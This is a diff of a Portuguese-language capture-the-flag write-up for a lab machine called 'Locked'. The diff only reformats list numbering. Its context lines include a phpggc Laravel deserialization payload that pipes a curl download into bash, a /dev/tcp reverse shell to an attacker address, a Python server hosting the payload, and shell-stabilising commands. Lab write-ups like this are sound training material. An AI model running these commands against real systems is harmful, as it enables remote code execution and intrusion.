@@ -61,13 +61,13 @@ phpggc -c laravel/rce16 system "curl -sSL http://10.0.73.93:8000/shell.sh | bash
 
 ![Payload](/images/hackingclub-locked/file-locked-2025-6.png)
 
-1.      Criamos um arquivo contendo a payload de shell reversa e hospedamos localmente para que seja baixado e executado no servidor.
+1 - Criamos um arquivo contendo a payload de shell reversa e hospedamos localmente para que seja baixado e executado no servidor.
 
 ```bash
 echo "sh -i >& /dev/tcp/10.0.73.93/1234 0>&1" > shell.sh
 ```
 
-2.      Subindo um servidor em python.
+2 - Subindo um servidor em python.
 
 ```bash
 python3 -m http.server 8000
@@ -75,7 +75,7 @@ python3 -m http.server 8000
 
 ![Files](/images/hackingclub-locked/file-locked-2025-7.png)
 
-3.      Obtemos a shell reversa através da deserialização insegura.
+3 - Obtemos a shell reversa através da deserialização insegura.
 
 ![Reverse Shell](/images/hackingclub-locked/file-locked-2025-8.png)
 
@@ -85,12 +85,12 @@ python3 -m http.server 8000
 
 Transformamos uma shell limitada numa TTY completa para permitir edição de linha, sinais (Ctrl+C), job control e melhor interatividade.
 
-1.      Inicia uma TTY bash interativa.
+1 - Inicia uma TTY bash interativa.
 ```bash
 python3 -c "import pty;pty.spawn('/bin/bash')" - CTRL+Z
 ```
 
-2.      Ajusta o terminal para modo bruto (sem eco) e traz a shell em foreground para funcionar corretamente.
+2 - Ajusta o terminal para modo bruto (sem eco) e traz a shell em foreground para funcionar corretamente.
 ```bash
 stty raw -echo ; fg
 ``` 
